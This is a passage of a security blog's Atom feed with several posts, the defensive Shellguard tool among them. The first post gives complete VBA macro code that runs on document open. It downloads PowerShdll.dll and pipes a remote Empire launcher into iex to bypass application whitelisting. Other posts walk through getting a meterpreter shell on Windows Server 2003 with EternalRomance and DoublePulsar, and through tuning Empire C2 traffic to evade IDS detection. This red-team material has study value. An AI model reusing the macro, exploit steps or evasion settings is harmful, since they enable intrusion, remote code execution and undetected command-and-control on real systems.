&lt;p&gt;The VBA script below is a PoC I wrote that spawns an Empire agent in a RES One environment. It downloads the proper &lt;code&gt;PowerShdll.dll&lt;/code&gt; corresponding to the system’s architecture to the user’s &lt;code&gt;Temp&lt;/code&gt; directory and executes the script at &lt;code&gt;https://127.0.0.1/Empire_default_launcher.ps1&lt;/code&gt; (in this case the output of &lt;code&gt;launcher ListenerName&lt;/code&gt;.&lt;/p&gt;

&lt;noscript&gt;&lt;pre&gt;Sub AutoOpen()
    Debugging
End Sub

Sub Document_Open()
    Debugging
End Sub

Public Function Debugging() As Variant
    DownloadDLL
    Dim Str As String
    Str = &amp;quot;C:\Windows\System32\rundll32.exe &amp;quot; &amp;amp; Environ(&amp;quot;TEMP&amp;quot;) &amp;amp; &amp;quot;\powershdll.dll,main . { iwr -useb https://127.0.0.1/Empire_default_launcher.ps1 } ^| iex;&amp;quot;
    strComputer = &amp;quot;.&amp;quot;
    Set objWMIService = GetObject(&amp;quot;winmgmts:\\&amp;quot; &amp;amp; strComputer &amp;amp; &amp;quot;\root\cimv2&amp;quot;)
    Set objStartup = objWMIService.Get(&amp;quot;Win32_ProcessStartup&amp;quot;)
    Set objConfig = objStartup.SpawnInstance_
    Set objProcess = GetObject(&amp;quot;winmgmts:\\&amp;quot; &amp;amp; strComputer &amp;amp; &amp;quot;\root\cimv2:Win32_Process&amp;quot;)
    errReturn = objProcess.Create(Str, Null, objConfig, intProcessID)
End Function


Sub DownloadDLL()
    Dim dll_Loc As String
    dll_Loc = Environ(&amp;quot;TEMP&amp;quot;) &amp;amp; &amp;quot;\powershdll.dll&amp;quot;
    If Not Dir(dll_Loc, vbDirectory) = vbNullString Then
        Exit Sub
    End If
    
    Dim dll_URL As String
    #If Win64 Then
        dll_URL = &amp;quot;https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dll&amp;quot;
    #Else
        dll_URL = &amp;quot;https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x86/Release/PowerShdll.dll&amp;quot;
    #End If
    
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject(&amp;quot;MSXML2.ServerXMLHTTP.6.0&amp;quot;)
    WinHttpReq.Open &amp;quot;GET&amp;quot;, dll_URL, False
    WinHttpReq.send

    myURL = WinHttpReq.responseBody
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject(&amp;quot;ADODB.Stream&amp;quot;)
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile dll_Loc
        oStream.Close
    End If
End Sub&lt;/pre&gt;&lt;/noscript&gt;
&lt;script src=&quot;https://gist.github.com/vivami/03780dd512fec22f3a2bae49f9023384.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;

&lt;h3 id=&quot;running-an-awl-solution&quot;&gt;Running an AWL solution?&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Try to blacklist &lt;code&gt;rundll32.exe&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Make sure to also include &lt;code&gt;dll's&lt;/code&gt; in your AWL. An AWL only checking for executables is not really a (AWL) &lt;strong&gt;solution&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Empire" /><category term="App whitelisting bypass" /><summary type="html">An increasing number of organisations is moving towards virtual desktop environments. They are often easier to administer and maintain, and provide possibilities for additional security layers. One of those security layers more and more encountered at organisations is the RES One Workspace whitelisting solution. While quite a lot was written lately on bypassing AWL (Application Whitelisting), these techniques are aimed towards bypassing Microsofts AppLocker/Device Guard in Windows 10. A reasonably secure configuration of RES One Workspace blocks execution of all of these Microsoft signed binaries (InstallUtil.exe, regsvcs.exe, regasm.exe, regsvr32.exe) used to run code within their context.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/markdown.jpg" /><media:content medium="image" url="https://vanmieghem.io/assets/images/markdown.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Eternalromance: eternal pwnage of Windows Server 2003 and XP</title><link href="https://vanmieghem.io/eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/" rel="alternate" type="text/html" title="Eternalromance: eternal pwnage of Windows Server 2003 and XP" /><published>2017-04-26T00:00:00+02:00</published><updated>2017-04-26T00:00:00+02:00</updated><id>https://vanmieghem.io/eternalromance-eternal-pwnage-of-windows-server-2003-and-xp</id><content type="html" xml:base="https://vanmieghem.io/eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/">&lt;p&gt;Most of the write-ups on the &lt;a href=&quot;https://github.com/misterch0c/shadowbroker&quot;&gt;leaked Equation Group tools&lt;/a&gt; by the shadow brokers are &lt;a href=&quot;https://www.exploit-db.com/docs/41896.pdf&quot;&gt;about the Eternalblue exploit&lt;/a&gt;, an RCE SMB exploit that provides SYSTEM to the attacker of Windows 7 and Windows Server 2008 machines not patched with &lt;a href=&quot;https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010&quot;&gt;MS17–010&lt;/a&gt;. Cool stuff, however, maybe even cooler is the stuff that will provide reverse shells for life: Eternalromance on fully patched Windows XP and Server 2003 machines. In this short write-up, I’ll explain how to get EternalRomance working by popping a meterpreter session on a fully patched Windows Server 2003 R2 SP2 box.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/1.png&quot; alt=&quot;win2003&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Fully patched Windows Server 2003.&lt;/figcaption&gt;

&lt;p&gt;Eternalromance requires shellcode for the exploitation phase. Any shellcode other than shellcode generated by the Doublepulsar implant, results in a BSOD on the box (trust me, I’ve tried this many times…).&lt;/p&gt;

&lt;p&gt;Start FuzzBunch and type &lt;code&gt;use Doublepulsar&lt;/code&gt;. Walk through the default options and choose function &lt;code&gt;OutputInstall&lt;/code&gt;. This generates the shellcode to feed to Eternalromance.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Doublepulsar generates &lt;code&gt;dopu_shellcode.bin&lt;/code&gt;&lt;/figcaption&gt;

&lt;p&gt;Walk through the default options of Eternalromance, let the Smbtouch execute and afterwards provide the &lt;code&gt;dopu_shellcode.bin&lt;/code&gt; shellcode file generated with Doublepulsar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Smbtouch via Eternalromance.&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Select proper DoPu shellcode file.&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Eternalromance succeeded.&lt;/figcaption&gt;

&lt;p&gt;After Eternalromance succeeded, let’s now prepare a payload of use to us, in this case a meterpreter shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Use msfvenom to generate a meterpreter stager DLL.&lt;/figcaption&gt;

&lt;p&gt;Now we’ll let Doublepulsar inject this &lt;code&gt;dll&lt;/code&gt;, and initiate a meterpreter session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Doublepulsar injects &lt;code&gt;meterpreter.dll&lt;/code&gt;&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/8.jpeg&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Meterpreter session on the Windows Server 2003 SP2.&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/shell.gif&quot; alt=&quot;shell&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seriously though, if your organisation relies on these legacy operating systems:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Disable SMBv1, or;&lt;/li&gt;
  &lt;li&gt;Segment the box&lt;/li&gt;
  &lt;li&gt;Run IDS/IPS with signatures for the maliciously crafted SMBv1 packet.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Stay safe!&lt;/p&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Exploitation" /><category term="MS17-010" /><summary type="html">Most of the write-ups on the leaked Equation Group tools by the shadow brokers are about the Eternalblue exploit, an RCE SMB exploit that provides SYSTEM to the attacker of Windows 7 and Windows Server 2008 machines not patched with MS17–010. Cool stuff, however, maybe even cooler is the stuff that will provide reverse shells for life: Eternalromance on fully patched Windows XP and Server 2003 machines. In this short write-up, I’ll explain how to get EternalRomance working by popping a meterpreter session on a fully patched Windows Server 2003 R2 SP2 box.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/markdown.jpg" /><media:content medium="image" url="https://vanmieghem.io/assets/images/markdown.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Reigning the Empire, evading detection</title><link href="https://vanmieghem.io/reigning-the-empire-evading-detection/" rel="alternate" type="text/html" title="Reigning the Empire, evading detection" /><published>2017-04-02T00:00:00+02:00</published><updated>2017-04-02T00:00:00+02:00</updated><id>https://vanmieghem.io/reigning-the-empire-evading-detection</id><content type="html" xml:base="https://vanmieghem.io/reigning-the-empire-evading-detection/">&lt;p&gt;&lt;strong&gt;tl;dr:&lt;/strong&gt; &lt;em&gt;Configure a (valid) certificate and add jitter to have Empire communications stay below the radar.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Empire, an open-source post exploitation framework by now well-known among pentesters and red teamers. &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;@harmj0y&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/sixdub&quot;&gt;@sixdub&lt;/a&gt;, and &lt;a href=&quot;https://twitter.com/enigma0x3&quot;&gt;@enigma0x3&lt;/a&gt; did a terrific job making Empire OpSec safe using various obfuscation techniques. On the endpoints, the most prominent and effective one is having most of the PowerShell modules ran in memory. On the network, it appears to be HTTP traffic where its communications are AES encrypted (more &lt;a href=&quot;https://www.powershellempire.com/?page_id=147&quot;&gt;here&lt;/a&gt;). Empire has been very effective for me, evading pretty much all of the detection mechanisms I had to pass. But recently, it got picked up on the wire by the custom IDS rules of a SOC service provider. As it turned out, I was being a bit sloppy, because Empire can be easily setup to evade these (rather lousy) IDS rules. This is a quick post on what is detected and how to set up Empire to bypass detection.&lt;/p&gt;

&lt;p&gt;So, let’s start out by firing up a listener with default values at &lt;code&gt;192.168.178.162&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/1_listener_setup.png&quot; alt=&quot;Listener_setup_1&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Empire listener with default values.&lt;/figcaption&gt;

&lt;p&gt;Execute the stager on the victim at &lt;code&gt;192.168.178.26&lt;/code&gt; and let’s sniff the traffic between attacker and victim.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/2_wireshark_traffic.png&quot; alt=&quot;wireshark_traffic_1&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Packet capture of HTTP traffic going to the Empire C2.&lt;/figcaption&gt;

&lt;p&gt;Instantly popping up is the large amount of HTTP keep-alive beacons the agent sends back to the C2. This in itself was not the issue, however, the fact that it requests the default Empire pages &lt;code&gt;/admin/get.php&lt;/code&gt;, &lt;code&gt;/news.asp&lt;/code&gt;, &lt;code&gt;/login/process.jsp&lt;/code&gt; was. If we look more closely to the C2 response, we also see that a default &lt;em&gt;“It works!”&lt;/em&gt; webpage is returned.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/3_wireshark_HTTP_packet.png&quot; alt=&quot;EmpireC2_packet&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Empire C2 response viewed in Wireshark. Default &quot;It works!&quot; page is returned.&lt;/figcaption&gt;

&lt;p&gt;A user constantly refreshing an &lt;em&gt;“It works!”&lt;/em&gt; page doesn’t really looks like the benign behaviour to me… Let’s see if we can obfuscate this a bit.
First thing we can do is customise the listeners’ &lt;code&gt;DefaultProfile&lt;/code&gt; to, in this case, &lt;code&gt;/feed.xml&lt;/code&gt; and &lt;code&gt;index.html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/4_listener_setup2.png&quot; alt=&quot;EmpireC2_listener2&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Empire listener with customised DefaultProfile parameter.&lt;/figcaption&gt;

&lt;p&gt;This change results in an obvious customisation of the HTTP requests. In my scenario, this alone was enough to evade the IDS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/5_beacon.png&quot; alt=&quot;beacon&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Keep-alive beacon using customised profile.&lt;/figcaption&gt;

&lt;p&gt;However, the default webpage &lt;em&gt;“It works!”&lt;/em&gt; is still there, which is lame.&lt;/p&gt;

&lt;p&gt;Now, if we provide the listener with a certificate (you may want to use a valid cert to increase stealthiness) and add random jitter, the communication is wrapped in a TLS layer and Empire specifics are gone!&lt;/p&gt;

&lt;p&gt;Excellent. 👌🏼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/6_listener_setup3.png&quot; alt=&quot;beacon&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Listener set up to use TLS for its communications.&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/7_wireshark_traffic_2.png&quot; alt=&quot;beacon&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;TLS wrapped communications between the agents and C2.&lt;/figcaption&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Empire" /><category term="Tradecraft" /><category term="Detection" /><summary type="html">tl;dr: Configure a (valid) certificate and add jitter to have Empire communications stay below the radar.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/markdown.jpg" /><media:content medium="image" url="https://vanmieghem.io/assets/images/markdown.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Virus Bulletin paper: Behavioural Detection and Prevention of Malware on OS X</title><link href="https://vanmieghem.io/VB-paper/" rel="alternate" type="text/html" title="Virus Bulletin paper: Behavioural Detection and Prevention of Malware on OS X" /><published>2016-09-16T00:00:00+02:00</published><updated>2016-09-16T00:00:00+02:00</updated><id>https://vanmieghem.io/VB-paper</id><content type="html" xml:base="https://vanmieghem.io/VB-paper/">&lt;p&gt;A paper published by Virus Bulletin on research performed during my Master thesis. Paper is available for download &lt;a href=&quot;https://vanmieghem.io/assets/vb201609-behavioural-detection-and-prevention.pdf&quot;&gt;here&lt;/a&gt;. Original publication is available &lt;a href=&quot;https://www.virusbulletin.com/blog/2016/september/paper-behavioural-detection-and-prevention-malware-os-x/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name>vivami</name></author><category term="project" /><category term="Paper" /><category term="Master Thesis" /><summary type="html">A paper published by Virus Bulletin on research performed during my Master thesis. Paper is available for download here. Original publication is available here.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/headers/virus-bulletin.jpg" /><media:content medium="image" url="https://vanmieghem.io/assets/images/headers/virus-bulletin.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Shellguard: blocking the execution of shell processes by unknown processes</title><link href="https://vanmieghem.io/shellguard/" rel="alternate" type="text/html" title="Shellguard: blocking the execution of shell processes by unknown processes" /><published>2016-07-06T00:00:00+02:00</published><updated>2016-07-06T00:00:00+02:00</updated><id>https://vanmieghem.io/shellguard</id><content type="html" xml:base="https://vanmieghem.io/shellguard/">&lt;p&gt;Shellguard is a security application implementing the results found during Master thesis research. ShellGuard aims to provide an extra generic layer of security by guarding the execution of a shell process on macOS. &lt;a href=&quot;/VB-paper/&quot;&gt;My research shows&lt;/a&gt; that OS X malware is strongly dependent on a shell process to harm the system. ShellGuard prevents the execution of shells by unknown processes.&lt;/p&gt;

&lt;p&gt;ShellGuard consists of a kernel extension (kext) and a userspace client/daemon that communicate through a &lt;code class=&quot;highlighter-rouge&quot;&gt;PF_SYSTEM&lt;/code&gt; socket. The kext uses OS X’s TrustedBSD framework to hook the execution system calls to become aware of process executions. Based on the policies defined in the &lt;code class=&quot;highlighter-rouge&quot;&gt;SG_config.json&lt;/code&gt; file, ShellGuard allows or denies the execution of shell processes (&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/python&lt;/code&gt; etc.).&lt;/p&gt;

&lt;p&gt;The ShellGuard daemon/client remains in userspace and runs in privileged mode, which is why I have chosen to write it in Swift, a memory safe language. The daemon parses the ShellGuard policy file (JSON) and passes these rules to the kernel extension.&lt;/p&gt;

&lt;p&gt;ShellGuard is available for download on &lt;a href=&quot;https://github.com/vivami/shellguard&quot;&gt;Github&lt;/a&gt;.&lt;/p&gt;</content><author><name>vivami</name></author><category term="project" /><category term="Github" /><category term="Master Thesis" /><summary type="html">Shellguard is a security application implementing the results found during Master thesis research. ShellGuard aims to provide an extra generic layer of security by guarding the execution of a shell process on macOS. My research shows that OS X malware is strongly dependent on a shell process to harm the system. ShellGuard prevents the execution of shells by unknown processes.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/headers/shellguard.png" /><media:content medium="image" url="https://vanmieghem.io/assets/images/headers/shellguard.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>